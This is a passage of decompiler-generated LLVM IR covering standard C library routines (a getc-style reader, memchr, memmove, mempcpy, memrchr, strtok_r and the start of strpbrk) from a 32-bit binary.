  %v5_8052b8c = inttoptr i32 %v4_8052b8c to i8*
  %v6_8052b8c = load i8, i8* %v5_8052b8c, align 1
  %v7_8052b8c = zext i8 %v6_8052b8c to i32
  %v8_8052b8c = load i32, i32* @edx, align 4
  %v9_8052b8c = and i32 %v8_8052b8c, -256
  %v10_8052b8c = or i32 %v9_8052b8c, %v7_8052b8c
  store i32 %v10_8052b8c, i32* %edx.global-to-local, align 4
  %v1_8052b90 = add i16 %v2_8052b7f, -1
  store i16 %v1_8052b90, i16* %v1_8052b7f, align 2
  %v0_8052b96 = load i32, i32* @ebx, align 4
  %v1_8052b96 = add i32 %v0_8052b96, 40
  %v2_8052b96 = inttoptr i32 %v1_8052b96 to i32*
  store i32 0, i32* %v2_8052b96, align 4
  %v0_8052b9d = load i32, i32* %edx.global-to-local, align 4
  %v1_8052b9d = urem i32 %v0_8052b9d, 256
  store i32 %v1_8052b9d, i32* @edx, align 4
  br label %dec_label_pc_8052c19

dec_label_pc_8052ba2:                             ; preds = %dec_label_pc_8052b7f
  %v1_8052ba2 = add i32 %v2_8052bb3, 16
  %v2_8052ba2 = inttoptr i32 %v1_8052ba2 to i32*
  %v3_8052ba2 = load i32, i32* %v2_8052ba2, align 4
  store i32 %v3_8052ba2, i32* @eax, align 4
  %v1_8052ba5 = add i32 %v2_8052bb3, 20
  %v2_8052ba5 = inttoptr i32 %v1_8052ba5 to i32*
  %v3_8052ba5 = load i32, i32* %v2_8052ba5, align 4
  %v15_8052ba5 = icmp eq i32 %v3_8052ba5, %v3_8052ba2
  %v1_8052ba8 = icmp eq i1 %v15_8052ba5, false
  br i1 %v1_8052ba8, label %dec_label_pc_8052bf1, label %dec_label_pc_8052baa

dec_label_pc_8052baa:                             ; preds = %dec_label_pc_8052ba2
  %v1_8052baa = add i32 %v2_8052bb3, 4
  %v2_8052baa = inttoptr i32 %v1_8052baa to i32*
  %v3_8052baa = load i32, i32* %v2_8052baa, align 4
  %v13_8052baa = icmp eq i32 %v3_8052baa, -2
  %v1_8052bae = icmp eq i1 %v13_8052baa, false
  br i1 %v1_8052bae, label %dec_label_pc_8052bb8, label %dec_label_pc_8052bb0

dec_label_pc_8052bb0:                             ; preds = %dec_label_pc_8052baa
  %v1_8052bb0 = or i32 %v3_8052b7f, 4
  store i32 %v1_8052bb0, i32* @ecx, align 4
  %v1_8052bb3 = trunc i32 %v1_8052bb0 to i16
  store i16 %v1_8052bb3, i16* %v1_8052b7f, align 2
  br label %dec_label_pc_8052c16

dec_label_pc_8052bb8:                             ; preds = %dec_label_pc_8052baa
  %v3_8052bb8 = and i16 %v2_8052b7f, 768
  %v4_8052bb8 = icmp eq i16 %v3_8052bb8, 0
  br i1 %v4_8052bb8, label %dec_label_pc_8052bcd, label %dec_label_pc_8052bbd

dec_label_pc_8052bbd:                             ; preds = %dec_label_pc_8052bb8
  %v3_8052bc5 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8059df8.163 to i16*))
  %v0_8052bcd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052bcd

dec_label_pc_8052bcd:                             ; preds = %dec_label_pc_8052bb8, %dec_label_pc_8052bbd
  %v0_8052c02 = phi i32 [ %v2_8052bb3, %dec_label_pc_8052bb8 ], [ %v0_8052bcd.pre, %dec_label_pc_8052bbd ]
  %v1_8052bcd = add i32 %v0_8052c02, 8
  %v2_8052bcd = inttoptr i32 %v1_8052bcd to i32*
  %v3_8052bcd = load i32, i32* %v2_8052bcd, align 4
  %v1_8052bd0 = add i32 %v0_8052c02, 12
  %v2_8052bd0 = inttoptr i32 %v1_8052bd0 to i32*
  %v3_8052bd0 = load i32, i32* %v2_8052bd0, align 4
  %v15_8052bd0 = icmp eq i32 %v3_8052bd0, %v3_8052bcd
  br i1 %v15_8052bd0, label %dec_label_pc_8052bfa, label %dec_label_pc_8052bd5

dec_label_pc_8052bd5:                             ; preds = %dec_label_pc_8052bcd
  %v2_8052bd8 = add i32 %v0_8052c02, 24
  %v3_8052bd8 = inttoptr i32 %v2_8052bd8 to i32*
  store i32 %v3_8052bcd, i32* %v3_8052bd8, align 4
  %v0_8052bdb = load i32, i32* @ebx, align 4
  %v2_8052bdc = call i32 @__stdio_rfill(i32 %v0_8052bdb)
  %v1_8052be4 = icmp eq i32 %v2_8052bdc, 0
  br i1 %v1_8052be4, label %dec_label_pc_8052c16, label %dec_label_pc_8052be8

dec_label_pc_8052be8:                             ; preds = %dec_label_pc_8052bd5
  %v0_8052be8 = load i32, i32* @ebx, align 4
  %v1_8052be8 = add i32 %v0_8052be8, 20
  %v2_8052be8 = inttoptr i32 %v1_8052be8 to i32*
  %v3_8052be8 = load i32, i32* %v2_8052be8, align 4
  %v2_8052beb = add i32 %v0_8052be8, 24
  %v3_8052beb = inttoptr i32 %v2_8052beb to i32*
  store i32 %v3_8052be8, i32* %v3_8052beb, align 4
  %v0_8052bee = load i32, i32* @ebx, align 4
  %v1_8052bee = add i32 %v0_8052bee, 16
  %v2_8052bee = inttoptr i32 %v1_8052bee to i32*
  %v3_8052bee = load i32, i32* %v2_8052bee, align 4
  br label %dec_label_pc_8052bf1

dec_label_pc_8052bf1:                             ; preds = %dec_label_pc_8052ba2, %entry, %dec_label_pc_8052be8
  %v1_8052bf5 = phi i32 [ %v2_8052bb3, %dec_label_pc_8052ba2 ], [ %v4_8052b48, %entry ], [ %v0_8052bee, %dec_label_pc_8052be8 ]
  %v0_8052bf1 = phi i32 [ %v3_8052ba2, %dec_label_pc_8052ba2 ], [ %v3_8052b4c, %entry ], [ %v3_8052bee, %dec_label_pc_8052be8 ]
  %v1_8052bf1 = inttoptr i32 %v0_8052bf1 to i8*
  %v2_8052bf1 = load i8, i8* %v1_8052bf1, align 1
  %v3_8052bf1 = zext i8 %v2_8052bf1 to i32
  store i32 %v3_8052bf1, i32* @edx, align 4
  %v1_8052bf4 = add i32 %v0_8052bf1, 1
  %v2_8052bf5 = add i32 %v1_8052bf5, 16
  %v3_8052bf5 = inttoptr i32 %v2_8052bf5 to i32*
  store i32 %v1_8052bf4, i32* %v3_8052bf5, align 4
  %v0_8052c1c.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052c19

dec_label_pc_8052bfa:                             ; preds = %dec_label_pc_8052bcd
  %v2_8052bfd = ptrtoint i8* %stack_var_-5 to i32
  %v5_8052c02 = inttoptr i32 %v0_8052c02 to i16*
  %v5_8052c03 = call i32 @__stdio_READ(i16* %v5_8052c02, i32 %v2_8052bfd, i32 1)
  %v1_8052c0b = icmp eq i32 %v5_8052c03, 0
  br i1 %v1_8052c0b, label %dec_label_pc_8052c16, label %dec_label_pc_8052c0f

dec_label_pc_8052c0f:                             ; preds = %dec_label_pc_8052bfa
  %v3_8052c0f = load i8, i8* %stack_var_-5, align 1
  %v4_8052c0f = sext i8 %v3_8052c0f to i32
  store i32 %v4_8052c0f, i32* @edx, align 4
  br label %dec_label_pc_8052c19

dec_label_pc_8052c16:                             ; preds = %dec_label_pc_8052bfa, %dec_label_pc_8052bd5, %dec_label_pc_8052b67, %dec_label_pc_8052bb0
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8052c19

dec_label_pc_8052c19:                             ; preds = %dec_label_pc_8052c0f, %dec_label_pc_8052bf1, %dec_label_pc_8052b87, %dec_label_pc_8052c16
  %v0_8052c1c = phi i32 [ %v4_8052c0f, %dec_label_pc_8052c0f ], [ %v0_8052c1c.pre, %dec_label_pc_8052bf1 ], [ %v1_8052b9d, %dec_label_pc_8052b87 ], [ -1, %dec_label_pc_8052c16 ]
  store i32 %v0_8052b44, i32* @ebx, align 4
  ret i32 %v0_8052c1c

; uselistorder directives
  uselistorder i32 %v0_8052bf1, { 1, 0 }
  uselistorder i32 %v3_8052bcd, { 1, 0 }
  uselistorder i32 %v0_8052c02, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8052ba2, { 1, 0, 2 }
  uselistorder i32 %v1_8052b9d, { 1, 0 }
  uselistorder i16 %v2_8052b7f, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8052bb3, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* @global_var_8059e40.154, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8052c19, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052c16, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052bf1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052bcd, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8052c20 = load i32, i32* @edi, align 4
  store i32 %v0_8052c20, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8052c27 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052c27, i32* %edi.global-to-local, align 4
  %v1_8052c2f = icmp eq i32 %arg3, 0
  store i1 %v1_8052c2f, i1* %zf.global-to-local, align 1
  br i1 %v1_8052c2f, label %dec_label_pc_8052c3f, label %dec_label_pc_8052c33

dec_label_pc_8052c33:                             ; preds = %entry
  %v2_8052c33 = call i32 @_strlen(i8* %arg1)
  %v3_8052c33 = mul i32 %v2_8052c33, -1
  %v4_8052c33 = add i32 %v3_8052c33, -2
  store i32 %v4_8052c33, i32* @ecx, align 4
  %v0_8052c35 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8052c35, label %dec_label_pc_8052c33.dec_label_pc_8052c3c_crit_edge, label %dec_label_pc_8052c37

dec_label_pc_8052c33.dec_label_pc_8052c3c_crit_edge: ; preds = %dec_label_pc_8052c33
  %v0_8052c3c.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8052c3c.pre, -1
  br label %dec_label_pc_8052c3c

dec_label_pc_8052c37:                             ; preds = %dec_label_pc_8052c33
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052c3c

dec_label_pc_8052c3c:                             ; preds = %dec_label_pc_8052c33.dec_label_pc_8052c3c_crit_edge, %dec_label_pc_8052c37
  %v0_8052c3c = phi i32 [ %phitmp, %dec_label_pc_8052c33.dec_label_pc_8052c3c_crit_edge ], [ 0, %dec_label_pc_8052c37 ]
  %v8_8052c3c = icmp eq i32 %v0_8052c3c, 0
  store i1 %v8_8052c3c, i1* %zf.global-to-local, align 1
  store i32 %v0_8052c3c, i32* %edi.global-to-local, align 4
  %v2_8052c3f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c3f

dec_label_pc_8052c3f:                             ; preds = %entry, %dec_label_pc_8052c3c
  %v0_8052c40 = phi i32 [ 0, %entry ], [ %v0_8052c3c, %dec_label_pc_8052c3c ]
  %v2_8052c3f = phi i32 [ %v0_8052c20, %entry ], [ %v2_8052c3f.pre, %dec_label_pc_8052c3c ]
  store i32 %v2_8052c3f, i32* @edi, align 4
  ret i32 %v0_8052c40

; uselistorder directives
  uselistorder i32 %v0_8052c3c, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8052c3f, { 1, 0 }
  uselistorder label %dec_label_pc_8052c3c, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8052c45 = load i32, i32* @esi, align 4
  store i32 %v0_8052c45, i32* %stack_var_-8, align 4
  %v4_8052c46 = ptrtoint i8* %arg1 to i32
  %v9_8052c52 = icmp ugt i8* %tmp3, %arg1
  %v1_8052c54 = icmp eq i1 %v9_8052c52, false
  br i1 %v1_8052c54, label %dec_label_pc_8052c5c, label %dec_label_pc_8052c56

dec_label_pc_8052c56:                             ; preds = %entry
  %v7_8052c58 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8052c68

dec_label_pc_8052c5c:                             ; preds = %entry
  %v3_8052c5c = add i32 %arg2, -1
  %v4_8052c5c = add i32 %v3_8052c5c, %tmp
  %v5_8052c5c = inttoptr i32 %v4_8052c5c to i8*
  %v3_8052c60 = add i32 %v4_8052c46, -1
  %v4_8052c60 = add i32 %v3_8052c60, %tmp
  %v5_8052c60 = inttoptr i32 %v4_8052c60 to i8*
  %v7_8052c65 = call i8* @_memcpy(i8* %v5_8052c60, i8* %v5_8052c5c, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8052c68

dec_label_pc_8052c68:                             ; preds = %dec_label_pc_8052c56, %dec_label_pc_8052c5c
  %v2_8052c68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052c68, i32* @esi, align 4
  ret i32 %v4_8052c46

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052c68, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052c6c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8052c7f = inttoptr i32 %arg1 to i16*
  %v4_8052c7f = call i32 @memcpy(i16* %v3_8052c7f, i32 %arg2, i32 %arg3)
  %v0_8052c87 = load i32, i32* @esi, align 4
  %v2_8052c87 = add i32 %v0_8052c87, %arg3
  store i32 %v0_8052c6c, i32* @esi, align 4
  ret i32 %v2_8052c87
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8052c95 = urem i32 %arg2, 256
  %v4_8052ca1 = sext i8 %arg1 to i32
  %v2_8052ca5 = add i32 %v4_8052ca1, %arg3
  %v1_8052cb76 = icmp eq i32 %arg3, 0
  br i1 %v1_8052cb76, label %dec_label_pc_8052cbf, label %dec_label_pc_8052cbb

dec_label_pc_8052ca9:                             ; preds = %dec_label_pc_8052cbb
  %v1_8052ca9 = add i32 %v0_8052ca9, -1
  %v5_8052caa = load i32, i32* @edx, align 4
  %v6_8052caa = and i32 %v5_8052caa, -256
  %v7_8052caa = or i32 %v6_8052caa, %v4_8052c95
  store i32 %v7_8052caa, i32* @edx, align 4
  %v1_8052cae = inttoptr i32 %v1_8052ca9 to i8*
  %v2_8052cae = load i8, i8* %v1_8052cae, align 1
  %v15_8052cae = icmp eq i8 %v2_8052cae, %tmp
  br i1 %v15_8052cae, label %dec_label_pc_8052d3c, label %dec_label_pc_8052cb6

dec_label_pc_8052cb6:                             ; preds = %dec_label_pc_8052ca9
  %v1_8052cb6 = add i32 %v0_8052cb6, -1
  %v8_8052cb6 = icmp eq i32 %v1_8052cb6, 0
  br i1 %v8_8052cb6, label %dec_label_pc_8052cbf, label %dec_label_pc_8052cbb

dec_label_pc_8052cbb:                             ; preds = %entry, %dec_label_pc_8052cb6
  %v0_8052cb6 = phi i32 [ %v1_8052cb6, %dec_label_pc_8052cb6 ], [ %arg3, %entry ]
  %v0_8052ca9 = phi i32 [ %v1_8052ca9, %dec_label_pc_8052cb6 ], [ %v2_8052ca5, %entry ]
  %v2_8052cbb = urem i32 %v0_8052ca9, 4
  %v3_8052cbb = icmp eq i32 %v2_8052cbb, 0
  %v1_8052cbd = icmp eq i1 %v3_8052cbb, false
  br i1 %v1_8052cbd, label %dec_label_pc_8052ca9, label %dec_label_pc_8052cbf

dec_label_pc_8052cbf:                             ; preds = %dec_label_pc_8052cb6, %dec_label_pc_8052cbb, %entry
  %v0_8052d22.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8052cb6 ], [ %v0_8052cb6, %dec_label_pc_8052cbb ]
  %v0_8052cc4 = phi i32 [ %v2_8052ca5, %entry ], [ %v1_8052ca9, %dec_label_pc_8052cb6 ], [ %v0_8052ca9, %dec_label_pc_8052cbb ]
  store i32 %v0_8052cc4, i32* @ecx, align 4
  %v2_8052cc8 = mul nuw nsw i32 %v4_8052c95, 256
  %v2_8052ccb = or i32 %v2_8052cc8, %v4_8052c95
  %v2_8052ccf = mul i32 %v2_8052ccb, 65536
  %v2_8052cd2 = or i32 %v2_8052ccf, %v2_8052ccb
  %v6_8052d2554 = icmp ugt i32 %v0_8052d22.pr, 3
  br i1 %v6_8052d2554, label %dec_label_pc_8052cd6, label %dec_label_pc_8052d27

dec_label_pc_8052cd6:                             ; preds = %dec_label_pc_8052cbf, %dec_label_pc_8052d1f
  %v0_8052d1f56 = phi i32 [ %v1_8052d1f, %dec_label_pc_8052d1f ], [ %v0_8052d22.pr, %dec_label_pc_8052cbf ]
  %v0_8052cd655 = phi i32 [ %v1_8052cd6, %dec_label_pc_8052d1f ], [ %v0_8052cc4, %dec_label_pc_8052cbf ]
  %v1_8052cd6 = add i32 %v0_8052cd655, -4
  store i32 %v1_8052cd6, i32* @ecx, align 4
  %v2_8052cdb = inttoptr i32 %v1_8052cd6 to i32*
  %v3_8052cdb = load i32, i32* %v2_8052cdb, align 4
  %v4_8052cdb = xor i32 %v3_8052cdb, %v2_8052cd2
  %v1_8052cdd = add i32 %v4_8052cdb, 2130640639
  %v1_8052ce3 = sub i32 -1, %v4_8052cdb
  %v2_8052ce5 = xor i32 %v1_8052cdd, %v1_8052ce3
  %v1_8052ce7 = and i32 %v2_8052ce5, -2130640640
  %v2_8052ce7 = icmp eq i32 %v1_8052ce7, 0
  br i1 %v2_8052ce7, label %dec_label_pc_8052d1f, label %dec_label_pc_8052cef

dec_label_pc_8052cef:                             ; preds = %dec_label_pc_8052cd6
  %v7_8052cef = or i32 %v1_8052ce7, %v4_8052c95
  %v1_8052cf3 = add i32 %v0_8052cd655, -1
  %v2_8052cf6 = inttoptr i32 %v1_8052cf3 to i8*
  %v3_8052cf6 = load i8, i8* %v2_8052cf6, align 1
  %v16_8052cf6 = icmp eq i8 %v3_8052cf6, %tmp
  br i1 %v16_8052cf6, label %dec_label_pc_8052d3c, label %dec_label_pc_8052cfb

dec_label_pc_8052cfb:                             ; preds = %dec_label_pc_8052cef
  %v1_8052cff = add i32 %v0_8052cd655, -2
  %v2_8052d02 = inttoptr i32 %v1_8052cff to i8*
  %v3_8052d02 = load i8, i8* %v2_8052d02, align 1
  %v16_8052d02 = icmp eq i8 %v3_8052d02, %tmp
  br i1 %v16_8052d02, label %dec_label_pc_8052d3c, label %dec_label_pc_8052d07

dec_label_pc_8052d07:                             ; preds = %dec_label_pc_8052cfb
  %v1_8052d0b = add i32 %v0_8052cd655, -3
  %v2_8052d0e = inttoptr i32 %v1_8052d0b to i8*
  %v3_8052d0e = load i8, i8* %v2_8052d0e, align 1
  %v16_8052d0e = icmp eq i8 %v3_8052d0e, %tmp
  br i1 %v16_8052d0e, label %dec_label_pc_8052d3c, label %dec_label_pc_8052d13

dec_label_pc_8052d13:                             ; preds = %dec_label_pc_8052d07
  %v1_8052d17 = inttoptr i32 %v1_8052cd6 to i8*
  %v2_8052d17 = load i8, i8* %v1_8052d17, align 1
  %v15_8052d17 = icmp eq i8 %v2_8052d17, %tmp
  %v1_8052d19 = icmp eq i1 %v15_8052d17, false
  br i1 %v1_8052d19, label %dec_label_pc_8052d1f, label %dec_label_pc_8052d1b

dec_label_pc_8052d1b:                             ; preds = %dec_label_pc_8052d13
  br label %dec_label_pc_8052d3c

dec_label_pc_8052d1f:                             ; preds = %dec_label_pc_8052d13, %dec_label_pc_8052cd6
  %v5_8052d2c26 = phi i32 [ %v7_8052cef, %dec_label_pc_8052d13 ], [ 0, %dec_label_pc_8052cd6 ]
  %v1_8052d1f = add i32 %v0_8052d1f56, -4
  %v6_8052d25 = icmp ugt i32 %v1_8052d1f, 3
  br i1 %v6_8052d25, label %dec_label_pc_8052cd6, label %dec_label_pc_8052d27

dec_label_pc_8052d27:                             ; preds = %dec_label_pc_8052d1f, %dec_label_pc_8052cbf
  %v5_8052d2c25.lcssa = phi i32 [ %v4_8052c95, %dec_label_pc_8052cbf ], [ %v5_8052d2c26, %dec_label_pc_8052d1f ]
  %v0_8052cd6.lcssa = phi i32 [ %v0_8052cc4, %dec_label_pc_8052cbf ], [ %v1_8052cd6, %dec_label_pc_8052d1f ]
  %v0_8052d1f.lcssa = phi i32 [ %v0_8052d22.pr, %dec_label_pc_8052cbf ], [ %v1_8052d1f, %dec_label_pc_8052d1f ]
  br label %dec_label_pc_8052d34

dec_label_pc_8052d2b:                             ; preds = %dec_label_pc_8052d34
  %v1_8052d34 = add i32 %v0_8052d34, -1
  %v1_8052d2b = add i32 %v0_8052d2b, -1
  %v6_8052d2c = and i32 %v5_8052d2c, -256
  %v7_8052d2c = or i32 %v6_8052d2c, %v4_8052c95
  %v1_8052d30 = inttoptr i32 %v1_8052d2b to i8*
  %v2_8052d30 = load i8, i8* %v1_8052d30, align 1
  %v15_8052d30 = icmp eq i8 %v2_8052d30, %tmp
  br i1 %v15_8052d30, label %dec_label_pc_8052d3c, label %dec_label_pc_8052d34

dec_label_pc_8052d34:                             ; preds = %dec_label_pc_8052d2b, %dec_label_pc_8052d27
  %v5_8052d2c = phi i32 [ %v7_8052d2c, %dec_label_pc_8052d2b ], [ %v5_8052d2c25.lcssa, %dec_label_pc_8052d27 ]
  %v0_8052d2b = phi i32 [ %v1_8052d2b, %dec_label_pc_8052d2b ], [ %v0_8052cd6.lcssa, %dec_label_pc_8052d27 ]
  %v0_8052d34 = phi i32 [ %v1_8052d34, %dec_label_pc_8052d2b ], [ %v0_8052d1f.lcssa, %dec_label_pc_8052d27 ]
  %v10_8052d35 = icmp eq i32 %v0_8052d34, 0
  %v1_8052d38 = icmp eq i1 %v10_8052d35, false
  br i1 %v1_8052d38, label %dec_label_pc_8052d2b, label %dec_label_pc_8052d3a

dec_label_pc_8052d3a:                             ; preds = %dec_label_pc_8052d34
  br label %dec_label_pc_8052d3c

dec_label_pc_8052d3c:                             ; preds = %dec_label_pc_8052ca9, %dec_label_pc_8052d07, %dec_label_pc_8052cfb, %dec_label_pc_8052cef, %dec_label_pc_8052d2b, %dec_label_pc_8052d1b, %dec_label_pc_8052d3a
  %v0_8052d3f = phi i32 [ %v1_8052cd6, %dec_label_pc_8052d1b ], [ 0, %dec_label_pc_8052d3a ], [ %v1_8052d2b, %dec_label_pc_8052d2b ], [ %v1_8052d0b, %dec_label_pc_8052d07 ], [ %v1_8052cff, %dec_label_pc_8052cfb ], [ %v1_8052cf3, %dec_label_pc_8052cef ], [ %v1_8052ca9, %dec_label_pc_8052ca9 ]
  ret i32 %v0_8052d3f

; uselistorder directives
  uselistorder i32 %v0_8052d34, { 1, 0 }
  uselistorder i32 %v1_8052d1f, { 0, 2, 1 }
  uselistorder i32 %v1_8052cd6, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8052cd655, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8052ccb, { 1, 0 }
  uselistorder i32 %v0_8052ca9, { 1, 0, 2 }
  uselistorder i32 %v2_8052ca5, { 1, 0 }
  uselistorder i32 %v4_8052c95, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 6, 0, 15, 16, 1, 14, 18, 13, 19, 3, 5, 4, 20, 7, 8, 9, 17, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052d3c, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052cd6, { 1, 0 }
  uselistorder label %dec_label_pc_8052cbf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052cbb, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052d40 = load i32, i32* @edi, align 4
  %v0_8052d41 = load i32, i32* @esi, align 4
  %v0_8052d42 = load i32, i32* @ebx, align 4
  store i32 %v0_8052d42, i32* %stack_var_-12, align 4
  %v4_8052d43 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052d43, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8052d4f = icmp eq i8* %arg1, null
  %v1_8052d51 = icmp eq i1 %v1_8052d4f, false
  br i1 %v1_8052d51, label %dec_label_pc_8052d55, label %dec_label_pc_8052d53

dec_label_pc_8052d53:                             ; preds = %entry
  %v1_8052d53 = inttoptr i32 %arg3 to i32*
  %v2_8052d53 = load i32, i32* %v1_8052d53, align 4
  store i32 %v2_8052d53, i32* @ebx, align 4
  br label %dec_label_pc_8052d55

dec_label_pc_8052d55:                             ; preds = %entry, %dec_label_pc_8052d53
  %v0_8052d58 = phi i32 [ %v4_8052d43, %entry ], [ %v2_8052d53, %dec_label_pc_8052d53 ]
  %v0_8052d55 = load i32, i32* @ecx, align 4
  %v5_8052d58 = inttoptr i32 %v0_8052d58 to i8*
  %v8_8052d59 = call i32 @__GI_strspn(i8* %v5_8052d58, i32 %arg2, i32 %v0_8052d55, i32 %v0_8052d55)
  store i32 %v8_8052d59, i32* %eax.global-to-local, align 4
  %v0_8052d61 = load i32, i32* @ebx, align 4
  %v2_8052d61 = add i32 %v0_8052d61, %v8_8052d59
  store i32 %v2_8052d61, i32* @ebx, align 4
  %v1_8052d63 = inttoptr i32 %v2_8052d61 to i8*
  %v2_8052d63 = load i8, i8* %v1_8052d63, align 1
  %v3_8052d63 = icmp eq i8 %v2_8052d63, 0
  %v1_8052d66 = icmp eq i1 %v3_8052d63, false
  br i1 %v1_8052d66, label %dec_label_pc_8052d6e, label %dec_label_pc_8052d68

dec_label_pc_8052d68:                             ; preds = %dec_label_pc_8052d55
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8052d6a = load i32, i32* @esi, align 4
  %v2_8052d6a = inttoptr i32 %v1_8052d6a to i32*
  store i32 %v2_8052d61, i32* %v2_8052d6a, align 4
  %v0_8052d98.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d95

dec_label_pc_8052d6e:                             ; preds = %dec_label_pc_8052d55
  %v0_8052d6e = load i32, i32* @edx, align 4
  %v0_8052d70 = load i32, i32* @edi, align 4
  %v8_8052d72 = call i32 @__GI_strpbrk(i8* %v1_8052d63, i32 %v0_8052d70, i32 %v0_8052d6e, i32 %v0_8052d6e)
  store i32 %v8_8052d72, i32* %eax.global-to-local, align 4
  %v2_8052d7a = icmp eq i32 %v8_8052d72, 0
  %v1_8052d7c = icmp eq i1 %v2_8052d7a, false
  br i1 %v1_8052d7c, label %dec_label_pc_8052d8d, label %dec_label_pc_8052d7e

dec_label_pc_8052d7e:                             ; preds = %dec_label_pc_8052d6e
  %v0_8052d82 = load i32, i32* @ebx, align 4
  %v5_8052d82 = inttoptr i32 %v0_8052d82 to i8*
  %v8_8052d83 = call i32 @rawmemchr(i8* %v5_8052d82, i32 0, i32 %v8_8052d72, i32 %v8_8052d72)
  br label %dec_label_pc_8052d91

dec_label_pc_8052d8d:                             ; preds = %dec_label_pc_8052d6e
  %v9_8052d72 = inttoptr i32 %v8_8052d72 to i8*
  store i8 0, i8* %v9_8052d72, align 1
  %v2_8052d90 = add i32 %v8_8052d72, 1
  br label %dec_label_pc_8052d91

dec_label_pc_8052d91:                             ; preds = %dec_label_pc_8052d7e, %dec_label_pc_8052d8d
  %storemerge = phi i32 [ %v2_8052d90, %dec_label_pc_8052d8d ], [ %v8_8052d83, %dec_label_pc_8052d7e ]
  %v0_8052d91 = phi i32 [ %v2_8052d90, %dec_label_pc_8052d8d ], [ %v8_8052d83, %dec_label_pc_8052d7e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8052d91 = load i32, i32* @esi, align 4
  %v2_8052d91 = inttoptr i32 %v1_8052d91 to i32*
  store i32 %v0_8052d91, i32* %v2_8052d91, align 4
  %v0_8052d93 = load i32, i32* @ebx, align 4
  store i32 %v0_8052d93, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d95

dec_label_pc_8052d95:                             ; preds = %dec_label_pc_8052d68, %dec_label_pc_8052d91
  %v0_8052d98 = phi i32 [ %v0_8052d98.pre, %dec_label_pc_8052d68 ], [ %v0_8052d93, %dec_label_pc_8052d91 ]
  %v2_8052d95 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052d95, i32* @ebx, align 4
  store i32 %v0_8052d41, i32* @esi, align 4
  store i32 %v0_8052d40, i32* @edi, align 4
  ret i32 %v0_8052d98

; uselistorder directives
  uselistorder i32 %v8_8052d72, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052d95, { 1, 0 }
  uselistorder label %dec_label_pc_8052d91, { 1, 0 }
  uselistorder label %dec_label_pc_8052d55, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052d9d = load i32, i32* @ebx, align 4
  %v2_8052db425 = load i8, i8* %arg1, align 1
  %v4_8052db629 = icmp eq i8 %v2_8052db425, 0
  br i1 %v4_8052db629, label %dec_label_pc_8052dbe, label %dec_label_pc_8052dba.lr.ph

dec_label_pc_8052dba.lr.ph:                       ; preds = %entry
